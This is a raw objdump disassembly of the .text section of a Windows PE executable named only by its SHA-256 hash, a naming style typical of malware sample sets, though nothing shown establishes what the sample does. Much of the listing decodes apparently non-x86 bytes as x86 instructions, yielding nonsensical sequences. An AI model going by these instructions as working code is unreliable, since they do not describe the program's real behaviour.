
52041cf226f57b8652c9da6c95f53d0408ea3732dfadf82f6dfe6fea8174b8dc.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	mov    al,ds:0x92
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x380c00
  402013:	add    BYTE PTR [eax+0xb000059],bh
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [edx],bl
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	or     BYTE PTR ds:0x3040000,dh
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [ecx-0x5705706],al
  402055:	ror    BYTE PTR [esi+0x54],0x19
  402059:	iret   
  40205a:	jae    0x4020ba
  40205c:	adc    al,0x61
  40205e:	aad    0xcd
  402060:	cwde   
  402061:	in     eax,dx
  402062:	or     DWORD PTR [ecx-0x186d05bf],ecx
  402068:	lock mov ebp,0xb63b70d0
  40206e:	fcmovbe st,st(7)
  402070:	jns    0x40200d
  402072:	enter  0x2eae,0x38
  402076:	loope  0x402023
  402078:	push   eax
  402079:	fistp  WORD PTR [ecx]
  40207b:	test   eax,0x5281762a
  402080:	push   esp
  402081:	add    BYTE PTR [esi+0x24520d38],ah
  402087:	jno    0x4020cb
  402089:	jge    0x4020a3
  40208b:	dec    eax
  40208c:	retf   0x169b
  40208f:	mov    eax,0xf4192671
  402094:	pop    ss
  402095:	not    DWORD PTR [ecx]
  402097:	sub    esi,eax
  402099:	jb     0x402081
  40209b:	add    al,0xb3
  40209d:	lahf   
  40209e:	push   0x1f904c17
  4020a3:	loop   0x40209b
  4020a5:	mov    dl,0xb4
  4020a7:	mov    bl,0x22
  4020a9:	mov    al,ds:0x178584e0
  4020ae:	aaa    
  4020af:	out    dx,eax
  4020b0:	mov    esp,0x860e8742
  4020b5:	adc    bh,BYTE PTR [edi-0x35]
  4020b8:	pop    edx
  4020b9:	jecxz  0x40207c
  4020bb:	mov    eax,0xab26def0
  4020c0:	push   ebx
  4020c1:	adc    edi,DWORD PTR [eax]
  4020c3:	ins    DWORD PTR es:[edi],dx
  4020c4:	mov    WORD PTR [eax-0x35],ss
  4020c7:	push   ebp
  4020c8:	sbb    DWORD PTR [edx+edx*8-0x61],ebx
  4020cc:	rcr    ecx,0x3d
  4020cf:	xchg   edi,eax
  4020d0:	sbb    dh,BYTE PTR [edx+0x1]
  4020d3:	add    BYTE PTR [eax],al
  4020d5:	jo     0x402101
  4020d7:	add    BYTE PTR [ebx],bl
  4020d9:	xor    BYTE PTR [edx],al
  4020db:	add    BYTE PTR [ebp+0x0],bl
  4020de:	add    BYTE PTR [eax],al
  4020e0:	add    DWORD PTR [eax],eax
  4020e2:	add    BYTE PTR [ecx],dl
  4020e4:	push   ss
  4020e5:	or     al,BYTE PTR [ebx]
  4020e7:	add    ch,BYTE PTR [edi+0x4]
  4020ea:	add    BYTE PTR [eax],al
  4020ec:	push   es
  4020ed:	sub    al,0x1a
  4020ef:	pop    ss
  4020f0:	or     al,BYTE PTR [ebx]
  4020f2:	outs   dx,DWORD PTR ds:[esi]
  4020f3:	pop    es
  4020f4:	add    BYTE PTR [eax],al
  4020f6:	push   es
  4020f7:	or     eax,DWORD PTR [edi]
  4020f9:	sub    eax,0x12280a
  4020fe:	add    BYTE PTR [esi],al
  402100:	sub    BYTE PTR [edx],dl
  402102:	add    BYTE PTR [eax],al
  402104:	or     al,BYTE PTR [edi]
  402106:	or     eax,0xd1736de
  40210b:	fidiv  WORD PTR [edx]
  40210d:	or     al,0x3
  40210f:	jnp    0x402139
  402111:	add    BYTE PTR [eax],al
  402113:	add    al,0x2c
  402115:	adc    eax,0x28122c06
  40211a:	adc    eax,DWORD PTR [eax]
  40211c:	add    BYTE PTR [edx],cl
  40211e:	or     BYTE PTR [edi+0x14],ch
  402121:	add    BYTE PTR [eax],al
  402123:	or     ch,BYTE PTR [edi+0x15]
  402126:	add    BYTE PTR [eax],al
  402128:	or     ch,BYTE PTR [ebx]
  40212a:	adc    BYTE PTR [eax],ch
  40212c:	adc    eax,DWORD PTR [eax]
  40212e:	add    BYTE PTR [edx],cl
  402130:	or     BYTE PTR [edi+0x16],ch
  402133:	add    BYTE PTR [eax],al
  402135:	or     ch,BYTE PTR [edi+0x15]
  402138:	add    BYTE PTR [eax],al
  40213a:	or     bl,dh
  40213c:	add    BYTE PTR [edi],dl
  40213e:	sub    cl,BYTE PTR [ecx]
  402140:	sub    al,BYTE PTR [eax]
  402142:	add    BYTE PTR [eax],al
  402144:	add    DWORD PTR [eax],edx
  402146:	add    BYTE PTR [eax],al
  402148:	add    BYTE PTR [eax],al
  40214a:	add    al,BYTE PTR [eax]
  40214c:	daa    
  40214d:	sub    DWORD PTR [eax],eax
  40214f:	xor    BYTE PTR [edi],ch
  402151:	add    BYTE PTR [eax],al
  402153:	add    DWORD PTR [ebx],edx
  402155:	xor    BYTE PTR [ebx],al
  402157:	add    BYTE PTR [edx],ch
  402159:	add    BYTE PTR [eax],al
  40215b:	add    BYTE PTR [edx],al
  40215d:	add    BYTE PTR [eax],al
  40215f:	adc    DWORD PTR [edx],eax
  402161:	pop    ds
  402162:	sbb    cl,BYTE PTR [ebp+0x2000005]
  402168:	jge    0x402193
  40216a:	add    BYTE PTR [eax],al
  40216c:	add    al,0x2
  40216e:	sub    BYTE PTR [edi],dl
  402170:	add    BYTE PTR [eax],al
  402172:	or     dl,BYTE PTR [esi]
  402174:	or     ch,BYTE PTR [ebx]
  402176:	or     eax,0x297b02
  40217b:	add    BYTE PTR [esi+eax*1],al
  40217e:	pop    ss
  40217f:	sahf   
  402180:	push   es
  402181:	pop    ss
  402182:	pop    eax
  402183:	or     al,BYTE PTR [esi]
  402185:	pop    ds
  402186:	sbb    dh,BYTE PTR [edx]
  402188:	out    dx,al
  402189:	sub    al,BYTE PTR [eax]
  40218b:	add    BYTE PTR [ebx],dl
  40218d:	xor    BYTE PTR [ebx],al
  40218f:	add    BYTE PTR [edi+0x3000001],bl
  402195:	add    BYTE PTR [eax],al
  402197:	adc    DWORD PTR [edi],ebx
  402199:	sbb    cl,BYTE PTR [ebp+0x1000030]
  40219f:	or     dl,BYTE PTR [esi]
  4021a1:	or     ebp,DWORD PTR [ebx]
  4021a3:	or     BYTE PTR [esi],al
  4021a5:	pop    es
  4021a6:	push   ss
  4021a7:	pushf  
  4021a8:	pop    es
  4021a9:	pop    ss
  4021aa:	pop    eax
  4021ab:	or     eax,DWORD PTR [edi]
  4021ad:	pop    ds
  4021ae:	sbb    dh,BYTE PTR [edx]
  4021b0:	repz push ss
  4021b2:	or     al,0x38
  4021b4:	push   0x1
  4021b6:	add    BYTE PTR [eax],al
  4021b8:	add    ecx,DWORD PTR [eax]
  4021ba:	call   0xa00:0x186f16
  4021c1:	pop    ds
  4021c2:	das    
  4021c3:	adc    BYTE PTR cs:[ebx],al
  4021c6:	or     BYTE PTR [edx+0x186f16],bl
  4021cc:	add    BYTE PTR [edx],cl
  4021ce:	pop    ds
  4021cf:	sub    eax,0x13b40
  4021d4:	add    BYTE PTR [ebx],al
  4021d6:	or     BYTE PTR [edx+0x196f],bl
  4021dc:	or     dl,BYTE PTR [edi]
  4021de:	ds sub eax,0x3000001
  4021e4:	or     BYTE PTR [edx+0x186f17],bl
  4021ea:	add    BYTE PTR [edx],cl
  4021ec:	pop    ds
  4021ed:	aas    
  4021ee:	xor    ecx,DWORD PTR ds:0x96f02
  4021f4:	add    BYTE PTR [esi],al
  4021f6:	sub    BYTE PTR [edx],dl
  4021f8:	add    BYTE PTR [eax],al
  4021fa:	or     dl,BYTE PTR [esi]
  4021fc:	sub    al,BYTE PTR [ebx]
  4021fe:	or     BYTE PTR [edx+0x186f17],bl
  402204:	add    BYTE PTR [edx],cl
  402206:	sub    BYTE PTR [edx],bl
  402208:	add    BYTE PTR [eax],al
  40220a:	or     ch,BYTE PTR ds:0x9a080325
  402210:	push   ss
  402211:	sbb    BYTE PTR [edi+0x1b],ch
  402214:	add    BYTE PTR [eax],al
  402216:	or     ch,BYTE PTR [eax]
  402218:	sldt   WORD PTR [eax]
  40221b:	push   es
  40221c:	jb     0x40224d
  40221e:	add    BYTE PTR [eax],al
  402220:	jo     0x402224
  402222:	outs   dx,DWORD PTR ds:[esi]
  402223:	or     DWORD PTR [eax],eax
  402225:	add    BYTE PTR [esi],al
  402227:	sub    BYTE PTR [eax+eax*1],bl
  40222a:	add    BYTE PTR [edx],cl
  40222c:	jae    0x40224b
  40222e:	add    BYTE PTR [eax],al
  402230:	or     bh,BYTE PTR [edx+0x3]
  402233:	or     BYTE PTR [edx+0x186f17],bl
  402239:	add    BYTE PTR [edx],cl
  40223b:	sub    BYTE PTR [esi],bl
  40223d:	add    BYTE PTR [eax],al
  40223f:	or     ch,BYTE PTR [eax]
  402241:	pop    ds
  402242:	add    BYTE PTR [eax],al
  402244:	or     cl,BYTE PTR ds:0x59411f09
  40224a:	adc    eax,DWORD PTR [edx+eax*1]
  40224d:	add    bh,BYTE PTR [ebx+0x29]
  402250:	add    BYTE PTR [eax],al
  402252:	add    al,0x11
  402254:	add    al,0x94
  402256:	pop    ss
  402257:	sub    BYTE PTR [eax+eax*1],cl
  40225a:	add    BYTE PTR [esi],al
  40225c:	sub    al,0x25
  40225e:	add    ecx,DWORD PTR [eax]
  402260:	call   0x0:0x1b6f1816
  402267:	or     ch,BYTE PTR [eax]
  402269:	sldt   WORD PTR [eax]
  40226c:	push   es
  40226d:	jb     0x40229e
  40226f:	add    BYTE PTR [eax],al
  402271:	jo     0x402275
  402273:	outs   dx,DWORD PTR ds:[esi]
  402274:	or     DWORD PTR [eax],eax
  402276:	add    BYTE PTR [esi],al
  402278:	sub    BYTE PTR [eax+eax*1],bl
  40227b:	add    BYTE PTR [edx],cl
  40227d:	jae    0x40229c
  40227f:	add    BYTE PTR [eax],al
  402281:	or     bh,BYTE PTR [edx+0x6]
  402284:	adc    DWORD PTR [eax+edx*4],eax
  402287:	sub    al,0x27
  402289:	add    al,BYTE PTR [edx]
  40228b:	jnp    0x4022b6
  40228d:	add    BYTE PTR [eax],al
  40228f:	add    al,0x11
  402291:	add    al,0x94
  402293:	sbb    BYTE PTR [eax],ch
  402295:	or     al,0x0
  402297:	add    BYTE PTR [esi],al
  402299:	sub    al,0x15
  40229b:	add    ecx,DWORD PTR [eax]
  40229d:	call   0x0:0x1b6f1816
  4022a4:	or     ch,BYTE PTR [eax]
  4022a6:	adc    BYTE PTR [eax],al
  4022a8:	add    BYTE PTR [esi],al
  4022aa:	jae    0x4022c9
  4022ac:	add    BYTE PTR [eax],al
  4022ae:	or     bh,BYTE PTR [edx+0x6]
  4022b1:	adc    DWORD PTR [edi+edx*1],eax
  4022b4:	pushf  
  4022b5:	adc    al,0x13
  4022b7:	add    eax,0x297b0202
  4022bc:	add    BYTE PTR [eax],al
  4022be:	add    al,0x11
  4022c0:	add    al,0x94
  4022c2:	push   ds
  4022c3:	sub    BYTE PTR [eax+eax*1],cl
  4022c6:	add    BYTE PTR [esi],al
  4022c8:	sub    eax,0x9a08033b
  4022cd:	outs   dx,DWORD PTR ds:[esi]
  4022ce:	sbb    DWORD PTR [eax],eax
  4022d0:	add    BYTE PTR [edx],cl
  4022d2:	sbb    BYTE PTR [ecx],dh
  4022d4:	or     eax,0x189a0803
  4022d9:	outs   dx,DWORD PTR ds:[esi]
  4022da:	and    BYTE PTR [eax],al
  4022dc:	add    BYTE PTR [edx],cl
  4022de:	adc    eax,DWORD PTR ds:0x1708232b
  4022e4:	pop    eax
  4022e5:	add    edx,DWORD PTR [esi]
  4022e7:	outs   dx,DWORD PTR ds:[esi]
  4022e8:	and    DWORD PTR [eax],eax
  4022ea:	add    BYTE PTR [edx],cl
  4022ec:	xor    ecx,DWORD PTR [esi]
  4022ee:	add    ecx,DWORD PTR [eax]
  4022f0:	call   0x7306:0x1128
  4022f7:	sbb    eax,0x7a0a0000
  4022fc:	or     BYTE PTR [edi],dl
  4022fe:	pop    eax
  4022ff:	or     al,0x3
  402301:	or     BYTE PTR [edx+0x9020513],bl
  402307:	adc    DWORD PTR ds:0x86f,eax
  40230d:	push   es
  40230e:	sub    ecx,DWORD PTR [esi]
  402310:	add    ecx,DWORD PTR [eax]
  402312:	call   0x7306:0xf28
  402319:	sbb    eax,0x7a0a0000
  40231e:	or     BYTE PTR [edi],dl
  402320:	pop    eax
  402321:	or     al,0x8
  402323:	add    edx,DWORD PTR [esi]
  402325:	outs   dx,DWORD PTR ds:[esi]
  402326:	and    DWORD PTR [eax],eax
  402328:	add    BYTE PTR [edx],cl
  40232a:	aas    
  40232b:	mov    esi,edi
  40232d:	(bad)  
  40232e:	inc    DWORD PTR [edx]
  402330:	outs   dx,DWORD PTR ds:[esi]
  402331:	push   es
  402332:	add    BYTE PTR [eax],al
  402334:	push   es
  402335:	pop    ss
  402336:	sub    al,BYTE PTR [eax]
  402338:	adc    esi,DWORD PTR [eax]
  40233a:	add    eax,DWORD PTR [eax]
  40233c:	cmp    al,BYTE PTR [eax]
  40233e:	add    BYTE PTR [eax],al
  402340:	add    al,BYTE PTR [eax]
  402342:	add    BYTE PTR [ecx],dl
  402344:	add    ebx,DWORD PTR [edi]
  402346:	inc    ecx
  402347:	xor    al,BYTE PTR ds:0x315a1f03
  40234d:	or     esi,DWORD PTR [edx+0x35]
  402350:	add    BYTE PTR [eax],al
  402352:	jo     0x4023c7
  402354:	sbb    eax,0x7a0a0000
  402359:	add    ebx,DWORD PTR [edi]
  40235b:	inc    ecx
  40235c:	pop    ecx
  40235d:	or     al,BYTE PTR [edx]
  40235f:	jnp    0x40238a
  402361:	add    BYTE PTR [eax],al
  402363:	add    al,0x6
  402365:	xchg   esp,eax
  402366:	pop    ss
  402367:	or     esi,DWORD PTR cs:[edx+0x35]
  40236b:	add    BYTE PTR [eax],al
  40236d:	jo     0x4023e2
  40236f:	sbb    eax,0x7a0a0000
  402374:	add    bh,BYTE PTR [ebx+0x29]
  402377:	add    BYTE PTR [eax],al
  402379:	add    al,0x6
  40237b:	add    al,0x9e
  40237d:	sub    bl,BYTE PTR [esi]
  40237f:	add    bh,BYTE PTR [ebx+0x28]
  402382:	add    BYTE PTR [eax],al
  402384:	add    al,0x2a
  402386:	and    al,BYTE PTR [edx]
  402388:	add    edi,DWORD PTR [ebp+0x28]
  40238b:	add    BYTE PTR [eax],al
  40238d:	add    al,0x2a
  40238f:	sub    al,BYTE PTR [ebx]
  402391:	add    al,0x5f
  402393:	push   ss
  402394:	inc    BYTE PTR [ecx]
  402396:	push   ss
  402397:	inc    BYTE PTR [ecx]
  402399:	sub    bl,BYTE PTR [edx]
  40239b:	sub    BYTE PTR [eax+eax*1],dl
  40239e:	add    BYTE PTR [esi],al
  4023a0:	sub    bl,BYTE PTR [esi]
  4023a2:	add    ch,BYTE PTR [eax]
  4023a4:	adc    eax,0x2a060000
  4023a9:	add    BYTE PTR [eax],al
  4023ab:	add    BYTE PTR [ebx],dl
  4023ad:	xor    BYTE PTR [eax+eax*1],al
  4023b0:	pop    ss
  4023b1:	add    BYTE PTR [eax],al
  4023b3:	add    BYTE PTR [eax+eax*1],al
  4023b6:	add    BYTE PTR [ecx],dl
  4023b8:	jb     0x40240d
  4023ba:	add    BYTE PTR [eax],al
  4023bc:	jo     0x4023d5
  4023be:	lea    eax,[ecx]
  4023c0:	add    BYTE PTR [eax],al
  4023c2:	add    DWORD PTR [edx],ecx
  4023c4:	push   es
  4023c5:	push   ss
  4023c6:	add    ah,BYTE PTR [edx+0x172806]
  4023cc:	add    BYTE PTR [esi],al
  4023ce:	sub    al,BYTE PTR [eax]
  4023d0:	adc    esi,DWORD PTR [eax]
  4023d2:	add    al,0x0
  4023d4:	pop    ss
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	add    BYTE PTR [eax+eax*1],al
  4023da:	add    BYTE PTR [ecx],dl
  4023dc:	jb     0x402363
  4023de:	add    BYTE PTR [eax],al
  4023e0:	jo     0x4023f9
  4023e2:	lea    eax,[ecx]
  4023e4:	add    BYTE PTR [eax],al
  4023e6:	add    DWORD PTR [edx],ecx
  4023e8:	push   es
  4023e9:	push   ss
  4023ea:	add    ah,BYTE PTR [edx+0x172806]
  4023f0:	add    BYTE PTR [esi],al
  4023f2:	sub    al,BYTE PTR [eax]
  4023f4:	adc    esi,DWORD PTR [eax]
  4023f6:	add    al,0x0
  4023f8:	pop    ss
  4023f9:	add    BYTE PTR [eax],al
  4023fb:	add    BYTE PTR [eax+eax*1],al
  4023fe:	add    BYTE PTR [ecx],dl
  402400:	jb     0x4023bd
  402402:	add    BYTE PTR [eax],al
  402404:	jo     0x40241d
  402406:	lea    eax,[ecx]
  402408:	add    BYTE PTR [eax],al
  40240a:	add    DWORD PTR [edx],ecx
  40240c:	push   es
  40240d:	push   ss
  40240e:	add    ah,BYTE PTR [edx+0x172806]
  402414:	add    BYTE PTR [esi],al
  402416:	sub    ch,BYTE PTR [esi]
  402418:	jb     0x4023fb
  40241a:	add    BYTE PTR [eax],al
  40241c:	jo     0x402446
  40241e:	push   ss
  40241f:	add    BYTE PTR [eax],al
  402421:	push   es
  402422:	sub    bl,BYTE PTR [esi]
  402424:	add    ch,BYTE PTR [eax]
  402426:	pop    ss
  402427:	add    BYTE PTR [eax],al
  402429:	or     ch,BYTE PTR [edx]
  40242b:	sbb    bh,BYTE PTR [esi+0x34]
  40242e:	add    BYTE PTR [eax],al
  402430:	add    al,0x2a
  402432:	push   ds
  402433:	add    al,BYTE PTR [eax+0x4000034]
  402439:	sub    al,BYTE PTR [esi+0x7e]
  40243c:	xor    eax,DWORD PTR [eax]
  40243e:	add    BYTE PTR [edx+eax*1],al
  402441:	jle    0x402477
  402443:	add    BYTE PTR [eax],al
  402445:	add    al,0x6f
  402447:	and    eax,DWORD PTR [eax]
  402449:	add    BYTE PTR [edx],cl
  40244b:	sub    dl,BYTE PTR [ebx]
  40244d:	xor    BYTE PTR [ebx],al
  40244f:	add    BYTE PTR [eax],ah
  402451:	add    BYTE PTR [eax],al
  402453:	add    BYTE PTR ds:0x7e110000,al
  402459:	xor    eax,DWORD PTR [eax]
  40245b:	add    BYTE PTR [edx+eax*1],al
  40245e:	jle    0x402494
  402460:	add    BYTE PTR [eax],al
  402462:	add    al,0x6f
  402464:	and    eax,DWORD PTR [eax]
  402466:	add    BYTE PTR [edx],cl
  402468:	or     ch,BYTE PTR [eax]
  40246a:	and    al,0x0
  40246c:	add    BYTE PTR [edx],cl
  40246e:	push   es
  40246f:	add    ebp,DWORD PTR [eax]
  402471:	and    eax,0xa0a0000
  402476:	push   es
  402477:	sub    ch,BYTE PTR [edx+0x10972]
  40247d:	jo     0x40244f
  40247f:	push   es
  402480:	add    BYTE PTR [eax],al
  402482:	add    ch,BYTE PTR [eax]
  402484:	add    BYTE PTR es:[eax],al
  402487:	or     ch,BYTE PTR [edi+0x27]
  40248a:	add    BYTE PTR [eax],al
  40248c:	or     ch,BYTE PTR [edi+0x28]
  40248f:	add    BYTE PTR [eax],al
  402491:	or     dh,BYTE PTR [ebx+0x29]
  402494:	add    BYTE PTR [eax],al
  402496:	or     al,BYTE PTR [eax+0x4000033]
  40249c:	adc    al,0x80
  40249e:	xor    al,0x0
  4024a0:	add    BYTE PTR [edx+ebp*1],al
  4024a3:	push   ds
  4024a4:	add    ch,BYTE PTR [eax]
  4024a6:	pop    ss
  4024a7:	add    BYTE PTR [eax],al
  4024a9:	or     ch,BYTE PTR [edx]
  4024ab:	xor    al,BYTE PTR [edx]
  4024ad:	sub    BYTE PTR ds:0x28060000,ah
  4024b3:	add    al,BYTE PTR [eax]
  4024b5:	add    BYTE PTR [esi],al
  4024b7:	sub    bh,BYTE PTR [esi+0x2]
  4024ba:	sub    BYTE PTR [ebx],al
  4024bc:	add    BYTE PTR [eax],al
  4024be:	push   es
  4024bf:	add    bh,BYTE PTR [esi+0x2a]
  4024c2:	add    BYTE PTR [eax],al
  4024c4:	or     bl,BYTE PTR [eax]
  4024c6:	sub    BYTE PTR ds:0x2060000,al
  4024cc:	push   ss
  4024cd:	jae    0x4024fa
  4024cf:	add    BYTE PTR [eax],al
  4024d1:	or     bh,BYTE PTR [ebp+0x36]
  4024d4:	add    BYTE PTR [eax],al
  4024d6:	add    al,0x2a
  4024d8:	push   es
  4024d9:	sub    al,BYTE PTR [eax]
  4024db:	add    BYTE PTR [ebx],bl
  4024dd:	xor    BYTE PTR [ebx],al
  4024df:	add    BYTE PTR [ebx+0x6000000],cl
  4024e5:	add    BYTE PTR [eax],al
  4024e7:	adc    DWORD PTR [eax],ebx
  4024e9:	lea    ecx,[edx]
  4024eb:	add    BYTE PTR [eax],al
  4024ed:	add    DWORD PTR [ebx],edx
  4024ef:	add    eax,0x2160511
  4024f4:	sub    BYTE PTR [esi],bl
  4024f6:	add    BYTE PTR [eax],al
  4024f8:	push   es
  4024f9:	mov    ds:0x2170511,al
  4024fe:	sub    BYTE PTR [edi],bl
  402500:	add    BYTE PTR [eax],al
  402502:	push   es
  402503:	mov    ds:0x60a0511,al
  402508:	adc    eax,DWORD PTR [esi]
  40250a:	push   ss
  40250b:	adc    eax,DWORD PTR [edi]
  40250d:	sub    edx,DWORD PTR [edx]
  40250f:	adc    DWORD PTR [esi],eax
  402511:	adc    DWORD PTR [edi],eax
  402513:	call   0x0:0x2c6f070b
  40251a:	or     dl,BYTE PTR [ecx]
  40251c:	pop    es
  40251d:	pop    ss
  40251e:	pop    eax
  40251f:	adc    eax,DWORD PTR [edi]
  402521:	adc    DWORD PTR [edi],eax
  402523:	adc    DWORD PTR [esi],eax
  402525:	mov    gs,WORD PTR [ecx+0x32]
  402528:	out    0x2,al
  40252a:	sub    BYTE PTR [edx],ah
  40252c:	add    BYTE PTR [eax],al
  40252e:	push   es
  40252f:	add    ch,BYTE PTR [eax]
  402531:	and    DWORD PTR [eax],eax
  402533:	add    BYTE PTR [esi],al
  402535:	push   es
  402536:	adc    ecx,DWORD PTR [eax]
  402538:	push   ss
  402539:	adc    ecx,DWORD PTR [ecx]
  40253b:	sub    edx,DWORD PTR [edx]
  40253d:	adc    DWORD PTR [eax],ecx
  40253f:	adc    DWORD PTR [ecx],ecx
  402541:	call   0x0:0x2d6f080c
  402548:	or     dl,BYTE PTR [ecx]
  40254a:	or     DWORD PTR [edi],edx
  40254c:	pop    eax
  40254d:	adc    ecx,DWORD PTR [ecx]
  40254f:	adc    DWORD PTR [ecx],ecx
  402551:	adc    DWORD PTR [eax],ecx
  402553:	mov    gs,WORD PTR [ecx+0x32]
  402556:	out    0x7e,al
  402558:	add    BYTE PTR cs:[eax],al
  40255b:	or     dl,BYTE PTR [ebx]
  40255d:	add    al,0xde
  40255f:	adc    BYTE PTR ds:0x2f2809,cl
  402565:	add    BYTE PTR [edx],cl
  402567:	jle    0x402599
  402569:	add    BYTE PTR [eax],al
  40256b:	or     dl,BYTE PTR [ebx]
  40256d:	add    al,0xde
  40256f:	add    BYTE PTR [ecx],dl
  402571:	add    al,0x2a
  402573:	add    BYTE PTR [ecx],al
  402575:	adc    BYTE PTR [eax],al
  402577:	add    BYTE PTR [eax],al
  402579:	add    BYTE PTR [eax],al
  40257b:	add    BYTE PTR [eax+0x78],bh
  40257e:	add    BYTE PTR [eax],dl
  402580:	das    
  402581:	add    BYTE PTR [eax],al
  402583:	add    DWORD PTR [ebx],edx
  402585:	xor    BYTE PTR [eax+eax*1],al
  402588:	mov    al,BYTE PTR [eax]
  40258a:	add    BYTE PTR [eax],al
  40258c:	pop    es
  40258d:	add    BYTE PTR [eax],al
  40258f:	adc    DWORD PTR [ebx+0x64],esi
  402592:	add    BYTE PTR [eax],al
  402594:	push   es
  402595:	or     al,BYTE PTR [esi]
  402597:	adc    al,0xfe
  402599:	push   es
  40259a:	add    BYTE PTR es:[eax],al
  40259d:	push   es
  40259e:	jae    0x4025d1
  4025a0:	add    BYTE PTR [eax],al
  4025a2:	or     ch,BYTE PTR [edi+0x61]
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	push   es
  4025a8:	sub    BYTE PTR [edx],dh
  4025aa:	add    BYTE PTR [eax],al
  4025ac:	or     ch,BYTE PTR [edi+0x33]
  4025af:	add    BYTE PTR [eax],al
  4025b1:	or     cl,BYTE PTR [ebx]
  4025b3:	pop    es
  4025b4:	sub    BYTE PTR [eax+eax*1],dh
  4025b7:	add    BYTE PTR [edx],cl
  4025b9:	pop    ss
  4025ba:	jae    0x4025f1
  4025bc:	add    BYTE PTR [eax],al
  4025be:	or     cl,BYTE PTR [esi+eax*1]
  4025c1:	pop    ss
  4025c2:	lea    edi,[edi]
  4025c4:	add    BYTE PTR [eax],al
  4025c6:	add    DWORD PTR [ebx],edx
  4025c8:	add    eax,0x8160511
  4025cd:	mov    ds:0x36730511,al
  4025d2:	add    BYTE PTR [eax],al
  4025d4:	or     cl,BYTE PTR ds:0x3773
  4025da:	or     dl,BYTE PTR [ebx]
  4025dc:	add    al,0x11
  4025de:	add    al,0x28
  4025e0:	cmp    BYTE PTR [eax],al
  4025e2:	add    BYTE PTR [edx],cl
  4025e4:	or     eax,edx
  4025e6:	or     eax,DWORD PTR [eax]
  4025e8:	add    BYTE PTR [edx],al
  4025ea:	sub    BYTE PTR [esi],ah
  4025ec:	add    BYTE PTR [eax],al
  4025ee:	or     dl,BYTE PTR [ecx]
  4025f0:	add    al,0x7e
  4025f2:	cmp    DWORD PTR [eax],eax
  4025f4:	add    BYTE PTR [edx],cl
  4025f6:	outs   dx,DWORD PTR ds:[esi]
  4025f7:	cmp    al,BYTE PTR [eax]
  4025f9:	add    BYTE PTR [edx],cl
  4025fb:	add    cl,BYTE PTR es:[ecx]
  4025fe:	sub    BYTE PTR [eax],ah
  402600:	add    BYTE PTR [eax],al
  402602:	push   es
  402603:	or     DWORD PTR [edi+0x3b],ebp
  402606:	add    BYTE PTR [eax],al
  402608:	or     ch,BYTE PTR [edi+0x3c]
  40260b:	add    BYTE PTR [eax],al
  40260d:	or     dh,BYTE PTR [ebx+0x2c]
  402610:	add    BYTE PTR [eax],al
  402612:	push   es
  402613:	outs   dx,DWORD PTR ds:[esi]
  402614:	cmp    eax,0x90a0000
  402619:	sub    al,BYTE PTR [eax]
  40261b:	add    BYTE PTR [ebx],dl
  40261d:	xor    BYTE PTR [eax+eax*1],al
  402620:	lea    eax,[eax]
  402622:	add    BYTE PTR [eax],al
  402624:	or     BYTE PTR [eax],al
  402626:	add    BYTE PTR [ecx],dl
  402628:	sub    BYTE PTR [edx],dh
  40262a:	add    BYTE PTR [eax],al
  40262c:	or     ch,BYTE PTR [edi+0x33]
  40262f:	add    BYTE PTR [eax],al
  402631:	or     cl,BYTE PTR [edx]
  402633:	push   es
  402634:	sub    BYTE PTR [esi],bh
  402636:	add    BYTE PTR [eax],al
  402638:	or     dl,BYTE PTR [edi]
  40263a:	jae    0x402671
  40263c:	add    BYTE PTR [eax],al
  40263e:	or     cl,BYTE PTR [ebx]
  402640:	rcl    BYTE PTR [edx],1
  402642:	add    BYTE PTR [eax],al
  402644:	add    ch,BYTE PTR [eax]
  402646:	add    BYTE PTR es:[eax],al
  402649:	or     dl,BYTE PTR [edi]
  40264b:	lea    edi,[edi]
  40264d:	add    BYTE PTR [eax],al
  40264f:	add    DWORD PTR [ebx],edx
  402651:	add    al,0x11
  402653:	add    al,0x16
  402655:	pop    es
  402656:	mov    ds:0x3f730411,al
  40265b:	add    BYTE PTR [eax],al
  40265d:	or     cl,BYTE PTR [ebx+esi*2]
  402660:	aaa    
  402661:	add    BYTE PTR [eax],al
  402663:	or     cl,BYTE PTR ds:0x382809
  402669:	add    BYTE PTR [edx],cl
  40266b:	or     al,dl
  40266d:	or     al,0x0
  40266f:	add    BYTE PTR [edx],al
  402671:	sub    BYTE PTR [esi],ah
  402673:	add    BYTE PTR [eax],al
  402675:	or     cl,BYTE PTR [ecx]
  402677:	jle    0x4026b9
  402679:	add    BYTE PTR [eax],al
  40267b:	or     ch,BYTE PTR [edi+0x3a]
  40267e:	add    BYTE PTR [eax],al
  402680:	or     ah,BYTE PTR [esi]
  402682:	or     BYTE PTR [edi+0x3b],ch
  402685:	add    BYTE PTR [eax],al
  402687:	or     ch,BYTE PTR [edi+0x3c]
  40268a:	add    BYTE PTR [eax],al
  40268c:	or     dh,BYTE PTR [ebx+0x41]
  40268f:	add    BYTE PTR [eax],al
  402691:	or     ch,BYTE PTR [edi+0x3d]
  402694:	add    BYTE PTR [eax],al
  402696:	or     al,BYTE PTR [edx]
  402698:	or     BYTE PTR [eax],ch
  40269a:	and    BYTE PTR [eax],al
  40269c:	add    BYTE PTR [esi],al
  40269e:	or     BYTE PTR [edi+0x3b],ch
  4026a1:	add    BYTE PTR [eax],al
  4026a3:	or     ch,BYTE PTR [edi+0x3c]
  4026a6:	add    BYTE PTR [eax],al
  4026a8:	or     dh,BYTE PTR [ebx+0x2c]
  4026ab:	add    BYTE PTR [eax],al
  4026ad:	push   es
  4026ae:	outs   dx,DWORD PTR ds:[esi]
  4026af:	cmp    eax,0x80a0000
  4026b4:	sub    al,BYTE PTR [esi]
  4026b6:	sub    bh,BYTE PTR [esi+0x2]
  4026b9:	jnp    0x4026f1
  4026bb:	add    BYTE PTR [eax],al
  4026bd:	add    al,0x6f
  4026bf:	inc    edx
  4026c0:	add    BYTE PTR [eax],al
  4026c2:	or     ah,BYTE PTR [esi]
  4026c4:	add    bh,BYTE PTR [ebx+0x36]
  4026c7:	add    BYTE PTR [eax],al
